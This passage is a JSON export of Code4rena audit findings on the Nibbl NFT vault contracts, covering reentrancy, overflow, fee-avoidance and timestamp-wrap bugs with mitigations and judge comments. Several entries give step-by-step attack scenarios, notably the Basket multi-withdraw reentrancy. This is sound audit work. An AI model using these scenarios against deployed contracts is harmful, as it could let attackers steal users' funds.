class=\"grvsc-source\"><span class=\"mtk7\">94</span><span class=\"mtk1\">:               </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokens</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokens</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)));</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L94\">https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L94</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NibblVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">   #</span><span class=\"mtk7\">3</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">517</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_to</span><span class=\"mtk1\">, </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)));</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L517\">https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L517</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NibblVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">   #</span><span class=\"mtk7\">4</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">526</span><span class=\"mtk1\">:              </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_to</span><span class=\"mtk1\">, </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_assets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)));</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L526\">https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L526</a></p>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "#l-03-return-values-of-transfertransferfrom-not-checked",
      "tags": [],
      "finders": []
    },
    {
      "id": "4964",
      "title": "[L-01] Buyouts that occur during the timestamp wrap will have valuation errors",
      "impact": "LOW",
      "content": "\nThe `_blockTimestamp` has a modulo applied, so at some point, there will be a timestamp with a value close to 2^32, followed by a timestamp close to zero. The `_updateTWAV` function does an unchecked subtraction of the two timestamps, so this will lead to an underflow, making the valuation based on a long time period rather than the actual one. Until more TWAV entries are added, valuations will be wrong\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/NibblVault.sol   #1\n\n303              uint32 _blockTimestamp = uint32(block.timestamp % 2**32);\n304              if (_blockTimestamp != lastBlockTimeStamp) {\n305:                 _updateTWAV(getCurrentValuation(), _blockTimestamp);   \n```\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L303-L305>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "#l-01-buyouts-that-occur-during-the-timestamp-wrap-will-have-valuation-errors",
      "tags": [],
      "finders": []
    },
    {
      "id": "2824",
      "title": "[M-12] Basket NFT have no name and symbol",
      "impact": "MEDIUM",
      "content": "_Submitted by Picodes, also found by cccz_\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L13>\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L6>\n\n### Impact\n\nThe `Basket` contract is intended to be used behind a proxy. But the `ERC721` implementation used is not upgradeable, and its constructor is called at deployment time on the implementation. So all proxies will have a void name and symbol, breaking all potential integrations and listings.\n\n### Proof of Concept\n\n`ERC721(\"NFT Basket\", \"NFTB\")` is called at deployment time, and sets private variable at the implementation level. Therefore when loading the code during `delegateCall`, these variables will not be initialized.\n\n### Recommended Mitigation Steps\n\nThe easiest mitigation would be to pass this variable as immutable so they are hardcoded in the implementation byte code.\n\n**[mundhrakeshav (Nibbl) confirmed](https://github.com/code-423n4/2022-06-nibbl-findings/issues/317)** \n\n**[Alex the Entreprenerd (warden) commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/317#issuecomment-1166657024):**\n > Finding is valid, impact is the name of the tokens.\n\n**[HardlyDifficult (judge) decreased severity to QA and commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/317#issuecomment-1172563153):**\n > Confirmed this is an issue.\n> \n> Assets are not at risk, and the function of the protocol is not impacted. All baskets created will have an empty name/symbol but generally there is no requirement that these values are populated. It's mostly for a better experience on frontends including etherscan. Downgrading and merging with the warden's QA report #314.\n\n**[Picodes (warden) commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/317#issuecomment-1174704129):**\n > @HardlyDifficult Indeed it does not break the protocol's logic and funds are not at risk, but the name and the symbol of the NFTs are not the ones chosen by the sponsor, and as it's the core of EIP721Metadata we could argue that the function of the protocol are impacted. \n> Also the experience on frontends (etherscan, opensea, etc) would have been significantly degraded. It could easily be considered a medium issue to me - especially considering the previous comments / reactions and the label \"confirmed\" added by the sponsor while it was high.\n\n**[HardlyDifficult (judge) increased severity to Medium and commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/317#issuecomment-1175198116):**\n > Thanks @Picodes! I can get onboard with that line of thinking. Given how significant these fields are for 3rd party integrators such as Etherscan and Opensea this can be considered to fall under that definition of Medium risk. I'll upgrade this report and the dupes to Medium.\n\n\n\n***\n\n\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `Basket` contract, which is intended to be used behind a proxy. The `ERC721` implementation used is not upgradeable and its constructor is called at deployment time on the implementation. This results in all proxies having a void name and symbol, breaking all potential integrations and listings. To prove this, it was shown that `ERC721(\"NFT Basket\", \"NFTB\")` is called at deployment time, and sets private variables at the implementation level. Therefore, when loading the code during `delegateCall`, these variables will not be initialized. The recommended mitigation step is to pass this variable as immutable so they are hardcoded in the implementation byte code.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/317",
      "tags": [],
      "finders": [
        "cccz",
        "Picodes"
      ]
    },
    {
      "id": "2823",
      "title": "[M-11] Twav.getTwav() will return a wrong result when twavObservations[TWAVBLOCK_NUMBERS - 1].timestamp = 0.",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L36\n\n\n## Vulnerability details\n\n## Impact\nThe \"if\" condition of Twav._getTwav() is missing some edge cases.\nIn this case, this function will return 0 which is different from the correct value and it will affect the main functions like NibblVault.buy() and NibblVault.sell().\n\n## Proof of Concept\nI think this condition is to confirm at least 4 values were saved for twav calculation.\nBtw this timestamp would be zero even though there are more than 4 values properly as it's modularized by 2**32.\nIn this case, the if condition will be false and this function will return 0.\n\n## Tools Used\nSolidity Visual Developer of VSCode\n\n## Recommended Mitigation Steps\nI see \"cumulativeValuation\" is increasing all the time and recommend replacing \"timestamp\" with \"cumulativeValuation\".\n```\nif (twavObservations[TWAV_BLOCK_NUMBERS - 1].cumulativeValuation != 0) {\n```",
      "summary": "\nThis bug report is about a vulnerability in the \"Twav\" smart contract, which can affect the main functions like NibblVault.buy() and NibblVault.sell(). The issue lies in the \"if\" condition of Twav._getTwav(), which is missing some edge cases. This can result in the function returning 0 instead of the correct value. The bug was discovered using the Solidity Visual Developer of VSCode. The recommended mitigation step is to replace \"timestamp\" with \"cumulativeValuation\", which is increasing all the time.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/112",
      "tags": [],
      "finders": [
        "hansfriese"
      ]
    },
    {
      "id": "2822",
      "title": "[M-10] Reentrancy bug in Basketâ€™s withdraw multiple tokens function which gives attacker ability to transfer basket ownership and spend it but withdraw all the tokens out of basket",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L41-L47\nhttps://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L68-L75\nhttps://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L91-L97\n\n\n## Vulnerability details\n\n## Impact\n`Basket` is used for keep multiple tokens in contract and mint one `NFT` token to represent their ownership. `Basket` only allows for owner of `NFT(id=0)` to withdraw tokens from `Basket` address. users can deposit multiple tokens in one `Basket` and then create a `NibbVault` based on that `Basket NFT`. but due to reentrancy vulnerability in `Basket` it's possible to call the multiple-token-withdraw functions (`withdrawMultipleERC721()`, `withdrawMultipleERC1155()`, `withdrawMultipleERC721()` and `withdrawMultipleERC20()`) and in the middle their external calls, spend `Basket NFT` (transfer ownership of `id=0` to other contract, for example `createVault()`) and receive some fund from other, then in the rest of the multiple-token-withdraw function withdraw all the basket tokens. `Basket` shouldn't allow transferring ownership of `id=0` in the middle of multiple token withdraws.\n\n## Proof of Concept\nThis is `withdrawMultipleERC721()` code:\n```\n    function withdrawMultipleERC721(address[] memory _tokens, uint256[] memory _tokenId, address _to) external override {\n        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\");\n        for (uint256 i = 0; i < _tokens.length; i++) {\n            IERC721(_tokens[i]).safeTransferFrom(address(this), _to, _tokenId[i]);\n            emit WithdrawERC721(_tokens[i], _tokenId[i], _to);\n        }\n    }\n```\nAs you can see, contract only checks the ownership of `id=0` in the beginning of the function to see that user allowed to perform this action or not. then it iterates through user specified addresses and call `safeTransferFrom()` function in those address by user specified values. the bug is that in the middle of the external calls attacker can spend `Basket NFT id=0` (give ownership of that basket to other contracts and receive fund from them, for example attacker can call `createVault` in `NibblVaultFactory` and create a vault and call other contracts to invest in that vault) then in the rest of the iterations in `withdrawMultipleERC721()` attacker can withdraw `Basket` tokens. so even so the ownership of the `Basket` has been transferred and attacker received funds for it, attacker withdraw `Basket` tokens too.\nThis is the steps attacker would perform:\n1. create a `Basket` with well known `NFT` token list. let's assume the `Basket` name is `Basket_M`\n2. give approve permission to `NibblVaultFactory` for `Basket_M id=0` token.\n3. call `Basket_M.withdrawMultipleERC721(address[] memory _tokens, uint256[] memory _tokenId, address _to)` with list of all the tokens in basket to withdraw all of them, but the first address in the `_tokens` list is the address that attacker controls.\n4. `Basket_M` would check that attacker is owner of the basket (owner of the `id = 0`) and in first iteration of the `for` it would call attacker controlled address which is a contract that attacker wrote its code.\n5. attacker contract would call `NibblVaultFactory.createVault()` with `Basket_M` address and `id=0` to create a vault which then transfer the ownership of `Basket_M id=0` to the vault address. let's assume it's `Vault_M`.\n6. attacker contract would buy some fraction of `Vault_M` by calling `buy()` function.\n7. let's assume there are other contracts(call it `Invest_Contract`) that would want to buy fraction of the well known `NFT`s in the basket and `Invest_Contract` invest some fund in vault having those `NFT` in vault's address or vault's basket just by calling `Invest_Contract`. attacker contract would call `Invest_Contract`  to invest in `Vault_M` and `Invest_Contract` would check that well known `NFT` is in `Basket_M id=0` which belongs to `Vault_M` to it would invest money on it by calling `initiateBuyout()`\n8. attacker contract then withdraw his money from `Vault_M` .\n9. the rest of `Basket_M.withdrawMultipleERC721()` for iterations performs and all the `NFT` tokens of the `Basket_M` would be send to attacker and `Basket_M` would have nothing.\n\nsteps 5 to 8 can be other things, the point is in those steps attacker would spent `Basket_M` and receive some fund from other contract while those other contracts checks that they are owner of the `Basket_M` which has well known `NFT` tokens, but in fact attacker withdraw those well known `NFT` tokens from `Basket_M` after spending it in the rest of the `withdrawMultipleERC721()` iterations. (those above step 5-8 is just a sample case)\n\nSo `Basket` shouldn't allow ownership transfer in the middle of the `Basket_M.withdrawMultipleERC721()` and similar multiple-token-withdraw functions or it should check the ownership in every iteration.\n\n## Tools Used\nVIM\n\n## Recommended Mitigation Steps\ncheck ownership of `id=0` in every iteration or don't allow ownership transfer in the multiple-token-transfer functions",
      "summary": "\nThis bug report is about a vulnerability in the Basket contract, which is used to keep multiple tokens in a contract and mint one NFT token to represent their ownership. The vulnerability allows users to call the multiple-token-withdraw functions and in the middle of the function, spend the Basket NFT token (transfer ownership of id=0 to other contracts), and receive some funds from other contracts. Then, in the rest of the multiple-token-withdraw function, the user can withdraw all the basket tokens. This should not be allowed, as the ownership of the Basket has already been transferred and the user has received funds for it.\n\nThe bug was found using VIM, and the recommended mitigation steps are to check the ownership of id=0 in every iteration, or to not allow ownership transfer in the multiple-token-transfer functions.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/185",
      "tags": [],
      "finders": [
        "unforgiven"
      ]
    },
    {
      "id": "2821",
      "title": "[M-09] NibblVault buyout duration longer than update timelock",
      "impact": "MEDIUM",
      "content": "_Submitted by reassor_\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/NibblVaultFactoryData.sol#L6>\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L158-L169>\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L37>\n\n### Impact\n\nUser can buy out NFT by initiating the process through `initiateBuyout`, then he has to wait `BUYOUT_DURATION` which is 5 days and if the buyout will not get rejected he can claim the NFT. During that period bidder cannot cancel the process. The issue is that since `NibblVault` is used through proxy it is possible to change its implementation through administrative functionality in `NibblVaultFactory` and the timelock for update'ing implementation is only 2 days.\n\nAttack Scenario:\n\n1.  Bidder initiates buyout through `initiateBuyout`\n2.  Administrator of the protocol updates the `vaultImplementation` through `proposeNewVaultImplementation`\n3.  Bidder really does not like new implementation but cannot cancel buyout process\n4.  Administrator waits 2 days (the `UPDATE_TIME`) uses `updateVaultImplementation` and changes the implementation\n5.  Bidder loses funds/fait in the protocol\n\n### Proof of Concept\n\n*   <https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/NibblVaultFactoryData.sol#L6>\n\n*   <https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L158-L169>\n\n*   <https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L37>\n\n### Tools Used\n\nManual Review / VSCode\n\n### Recommended Mitigation Steps\n\nIt is recommended to either implement functionality for bidder to cancel the bid or increase/decrease the `UPDATE_TIME`/`BUYOUT_DURATION` so the invariant `BUYOUT_DURATION < UPDATE_TIME` holds.\n\n**[mundhrakeshav (Nibbl) acknowledged, but disagreed with severity](https://github.com/code-423n4/2022-06-nibbl-findings/issues/278)** \n\n**[HardlyDifficult (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/278#issuecomment-1172985223):**\n > It seems the bidder could be left in a bad state, and updating the thresholds here may be a nice way to maintain expectations. Since this scenario is based on the admin making an undesirable change, this is a Medium risk report.\n\n\n\n***\n\n",
      "summary": "\nThis bug report concerns a vulnerability in the code for NibblVaultFactoryData.sol, NibblVaultFactory.sol, and NibblVault.sol. The vulnerability allows an administrator of the protocol to change the implementation of NibblVault while a bidder is waiting for a buyout to be completed. The buyout process should take 5 days, but the administrator can update the implementation of NibblVault after only 2 days. This leaves the bidder with no way to cancel the buyout process and they could potentially lose funds or faith in the protocol.\n\nThe bug was discovered through manual review and VSCode. The recommended mitigation steps for this bug are to either implement a function for the bidder to cancel the bid, or to increase/decrease the BUYOUT_DURATION and UPDATE_TIME so that the invariant BUYOUT_DURATION < UPDATE_TIME holds.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/278",
      "tags": [],
      "finders": [
        "reassor"
      ]
    },
    {
      "id": "2820",
      "title": "[M-08] [PNM-004] Calculation of _secondaryReserveRatio can be overflowed",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L183\n\n\n## Vulnerability details\n\n## Description\n\n`uint32 _secondaryReserveRatio = uint32((msg.value * SCALE * 1e18) / (_initialTokenSupply * _initialTokenPrice));` \n\n`_secondaryReserveRatio` can be overflowed by setting a relatively small `_initialTokenSupply` and `_initialTokenPrice`. The result will be truncated by `uint32`, causing an overflow.\n\nThis overflow can bypass all the checks in function `initialize`. Any following functionality will be impacted since the `_secondaryReserveRatio` is incorrect.\n\n## PoC / Attack Scenario\n\n+ The user provide `_initialTokenSupply` and `_initialTokenPrice`, which meets `SCALE * 1e18 == _initialTokenSupply * _initialTokenPrice`\n+ The `msg.value` is set as `2 ** 32 + X`, where `MIN_SECONDARY_RESERVE_RATIO <= X <= primaryReserveRatio`. Note that `msg.value` is in Wei, so the deposited fund is not huge.\n\n## Suggested Fix\n\nAdd overflow checks.",
      "summary": "\nThis bug report is about an overflow vulnerability in the code of the NibblVault.sol contract on the GitHub repository code-423n4/2022-06-nibbl. The overflow is caused by setting a relatively small _initialTokenSupply and _initialTokenPrice which results in the truncation of the _secondaryReserveRatio. This causes the overflow to bypass all the checks in the initialize function and any following functionality will be impacted. \n\nAn attack scenario is provided in the report which suggests setting the msg.value to 2**32 + X where MIN_SECONDARY_RESERVE_RATIO <= X <= primaryReserveRatio. This allows the user to deposit a relatively small amount of funds while still being able to exploit the overflow. \n\nThe suggested fix for this vulnerability is to add overflow checks.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/273",
      "tags": [],
      "finders": [
        "PwnedNoMore",
        "ych18"
      ]
    },
    {
      "id": "2819",
      "title": "[M-07]  _updateTwav() and _getTwav() will revert when cumulativePrice overflows",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L28\nhttps://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L40\n\n\n## Vulnerability details\n\n## Impact\nContract will break when `cumulativeValuation` overflows.\n\n## PoC\n\nCumulative prices are designed to work with overflows/underflows because in the end  the difference is important.\n\nIn `_updateTwav()`  when _`prevCumulativeValuation + (_valuation *_timeElapsed)`  overflows the contract will not work anymore.\n\n    twavObservations[twavObservationsIndex] = TwavObservation(_blockTimestamp, _prevCumulativeValuation + (_valuation * _timeElapsed)); //add the previous observation to make it cumulative @audit overflow breaks the contract\n\nSame  problem in `_getTwav()`\n\n      _twav = (_twavObservationCurrent.cumulativeValuation - _twavObservationPrev.cumulativeValuation) / (_twavObservationCurrent.timestamp - _twavObservationPrev.timestamp);@audit same overflow breaks the contract\n    \n    }\n\n## Similar issues\n\nhttps://github.com/code-423n4/2022-04-phuture-findings/issues/62\n\n## Recommended\n\nAdd unchecked keyword in every line you add / subtract cumulative prices.",
      "summary": "\nThis bug report is about the Twav contract, which is a part of the 2022-06-nibbl repository on GitHub. The issue is that when the cumulativeValuation overflows, the contract will break. This can be seen in the two lines of code provided in the report. In the first line, when the cumulativeValuation is added to the previous cumulativeValuation, the contract will break if the value overflows. The same problem is present in the second line, where the cumulativeValuation is subtracted from the previous cumulativeValuation. This can lead to the contract breaking if the value overflows. \n\nThe impact of this bug is that the contract will break if the cumulativeValuation overflows. To prove this, a PoC (Proof of Concept) is provided in the report. This PoC shows how the contract will break if the cumulativeValuation overflows. A similar issue is also provided in the report, which can be found in the 2022-04-phuture-findings repository on GitHub. \n\nThe recommended solution to this issue is to add the unchecked keyword in every line that adds or subtracts the cumulativeValuation. This will help to prevent the contract from breaking if the cumulativeValuation overflows.",
      "quality_score": 3,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/246",
      "tags": [
        "Overflow/Underflow"
      ],
      "finders": [
        "WatchPug",
        "peritoflores"
      ]
    },
    {
      "id": "2818",
      "title": "[M-06] NibblVault: In the buy function, users can avoid paying fees",
      "impact": "MEDIUM",
      "content": "_Submitted by cccz, also found by kenzo, Lambda, WatchPug, xiaoming90, and zzzitron_\n\nIn the buy function of the NibblVault contract, when msg.value > \\_lowerCurveDiff, the fee for SecondaryCurve part  is not charged.\n\n                if (_lowerCurveDiff >= msg.value) {\n                    _purchaseReturn = _buySecondaryCurve(msg.value, _totalSupply);\n                } else {\n                    //Gas Optimization\n                    _purchaseReturn = _initialTokenSupply - _totalSupply;\n                    secondaryReserveBalance += _lowerCurveDiff;\n                    // _purchaseReturn = _buySecondaryCurve(_to, _lowerCurveDiff);\n                    _purchaseReturn += _buyPrimaryCurve(msg.value - _lowerCurveDiff, _totalSupply + _purchaseReturn);\n                } \n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L314-L323>\n\n### Recommended Mitigation Steps\n\nThe fee for the SecondaryCurve part is complex to charge. I implemented the \\_caculateFeeSecondaryCurve and \\_reverseFeeSecondaryCurve functions to do the relevant calculations.\n\nThe \\_caculateFeeSecondaryCurve function is used to calculate the value after the fee is charged, but not to actually charge the fee. The \\_reverseFeeSecondaryCurve function is used to calculate the value before the fee is charged.\n\n                if (_lowerCurveDiff >= _caculateFeeSecondaryCurve(msg.value)) {\n                    _purchaseReturn = _buySecondaryCurve(msg.value, _totalSupply);\n                } else {\n                    //Gas Optimization\n                    _purchaseReturn = _initialTokenSupply - _totalSupply;\n                    secondaryReserveBalance += _lowerCurveDiff;\n                    uint256 _amount = _reverseFeeSecondaryCurve(_lowerCurveDiff);\n                    _chargeFeeSecondaryCurve(_amount);\n                    // _purchaseReturn = _buySecondaryCurve(_to, _lowerCurveDiff);\n                    _purchaseReturn += _buyPrimaryCurve(msg.value - _amount, _totalSupply + _purchaseReturn);\n                } \n\n```\n\n    function _caculateFeeSecondaryCurve(uint256 _amount) private returns(uint256) {\n       address payable _factory = factory;\n        uint256 _adminFeeAmt = NibblVaultFactory(_factory).feeAdmin();\n        uint256 _feeAdmin = (_amount * _adminFeeAmt) / SCALE ;\n        uint256 _feeCurator = (_amount * curatorFee) / SCALE ;\n        return _amount - (_feeAdmin + _feeCurator);\n    }\n    function _reverseFeeSecondaryCurve(uint256 _amount) private returns(uint256) {\n       address payable _factory = factory;\n        uint256 _adminFeeAmt = NibblVaultFactory(_factory).feeAdmin();\n        return _amount * SCALE / (SCALE - (_adminFeeAmt + curatorFee));\n    }\n```\n\n**[mundhrakeshav (Nibbl) acknowledged, but disagreed with severity](https://github.com/code-423n4/2022-06-nibbl-findings/issues/14)**\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/14#issuecomment-1173125051):**\n > Failing to collect fees is a form of leaking value for the curator and therefore falls into the Medium risk definition -- keeping the severity as reported.\n\n\n\n***\n\n",
      "summary": "\nThis bug report describes an issue with the buy function of the NibblVault contract. When msg.value is greater than _lowerCurveDiff, the fee for SecondaryCurve part is not charged. This means that an attacker could exploit this vulnerability to purchase tokens from the contract without paying the full fee. The proof of concept for this vulnerability can be found at the given GitHub link.\n\nTo fix this issue, two new functions have been implemented. The _caculateFeeSecondaryCurve and _reverseFeeSecondaryCurve functions are used to calculate the value after the fee is charged and to calculate the value before the fee is charged, respectively. These functions are used to ensure that the fee is charged correctly. The code for these functions is also included in the bug report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/14",
      "tags": [],
      "finders": [
        "cccz",
        "xiaoming90",
        "WatchPug",
        "Lambda",
        "zzzitron",
        "kenzo"
      ]
    },
    {
      "id": "2817",
      "title": "[M-05] Lack of sanity check on _initialTokenSupply and _initialTokenPrice can lead to a seller losing his NFT",
      "impact": "MEDIUM",
      "content": "_Submitted by itsmeSTYJ_\n\nThere is no sanity check to ensure that `(primaryReserveRatio * _initialTokenSupply * _initialTokenPrice)` is â‰¥ `(SCALE * 1e18)`. As a result, `_primaryReserveBalance` is given a value of 0 since divisions in solidity are rounded down. This also means that `primaryReserveBalance` and `fictitiousPrimaryReserveBalance` have a value of 0.\n\nWhen this happens, the `buy` function doesnâ€™t work because `_chargeFee` will revert on [line 222](https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L222). You canâ€™t `sell` either since `totalSupply == initialSupply`. The only way to recover the NFT is for the owner of the NFT to call `initiateBuyout` but there is always the possibility that someone else also spotted this mistake and will attempt to also call `initiateBuyout` once the `minBuyoutTime` is reached. If the owner loses this gas war, the owner has effectively lost his NFT.\n\n### Recommended Mitigation Steps\n\nAdd some sanity checks to ensure a sane expected value for `_initialTokenSupply` and `_initialTokenPrice`. There were multiple instances when a user tried to interact with a contract but entered a wrong value because they are not aware they needed to include decimals. A recent example of this is <https://cointelegraph.com/news/1-million-rock-nft-sells-for-a-penny-in-all-ore-nothing-error>.\n\n***\n\n*Note: Normally, I would categorise issues like this as medium severity since it is a loss predicated on having met certain conditions but because there is also a lack of sanity check on `_minBuyoutTime`, it is entirely possible for a seller to lose his NFT immediately once the vault is created. There are many monsters waiting in the dark forest, all it takes is one mistake. That said, I will defer the final judgement to the judges & sponsors.*\n\n**[mundhrakeshav (Nibbl) disputed, disagreed with severity and commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/24#issuecomment-1166304473):**\n > Case when that would happen is _initialTokenSupply or _initialTokenPrice is 0. But then it would revert here\n> https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L183\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/24#issuecomment-1172976012):**\n > > Case when that would happen is _initialTokenSupply or _initialTokenPrice is 0.\n> 